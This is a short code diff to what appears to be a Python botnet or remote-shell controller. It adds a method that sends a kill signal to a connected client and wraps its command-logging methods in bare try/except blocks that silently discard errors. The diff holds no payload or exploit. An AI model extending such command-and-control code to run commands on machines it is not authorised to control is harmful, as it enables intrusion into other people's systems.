@@ -155,6 +155,15 @@ class BotNet(Thread):
                         log.append(entry)
             return log
 
+    def sendKillProc(self, user):
+        with self.connlock:
+            if user in self.allConnections:
+                self.allConnections[user].send("True", type="kill")
+                return True
+            self.socketio.emit('response',
+                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
+            return False
+
     def sendStdin(self, user, cmd):
         with self.connlock:
             if user in self.allConnections:
@@ -328,25 +337,34 @@ class BotLog:
 
     def logstdin(self,win):
         if len(win) > 0:
-            self.log.append((BotLog.STDIN, win))
-            self.logobj.write("[IN]: \t" + str(win)+("\n" if win[-1]!="\n" else ""))
-            self.logobj.flush()
-            if len(self.log) > self.maxlen:
-                self.log.pop()
+            try:
+                self.log.append((BotLog.STDIN, win))
+                self.logobj.write("[IN]: \t" + str(win)+("\n" if win[-1]!="\n" else ""))
+                self.logobj.flush()
+                if len(self.log) > self.maxlen:
+                    self.log.pop()
+            except:
+                pass
 
     def logstdout(self, wout):
         if len(wout) > 0:
-            self.log.append((BotLog.STDOUT,wout))
-            self.logobj.write("[OUT]:\t"+str(wout)+("\n" if wout[-1]!="\n" else ""))
-            self.logobj.flush()
-            if len(self.log)>self.maxlen:
-                self.log.pop()
+            try:
+                self.log.append((BotLog.STDOUT,wout))
+                self.logobj.write("[OUT]:\t"+str(wout)+("\n" if wout[-1]!="\n" else ""))
+                self.logobj.flush()
+                if len(self.log)>self.maxlen:
+                    self.log.pop()
+            except:
+                pass
 
     def logstderr(self, wout):
         if len(wout)>0:
-            self.log.append((BotLog.STDERR, wout))
-            self.logobj.write("[ERR]:\t" + str(wout)+("\n" if wout[-1]!="\n" else ""))
-            self.logobj.flush()
-            if len(self.log) > self.maxlen:
-                self.log.pop()
+            try:
+                self.log.append((BotLog.STDERR, wout))
+                self.logobj.write("[ERR]:\t" + str(wout)+("\n" if wout[-1]!="\n" else ""))
+                self.logobj.flush()
+                if len(self.log) > self.maxlen:
+                    self.log.pop()
+            except:
+                pass
 
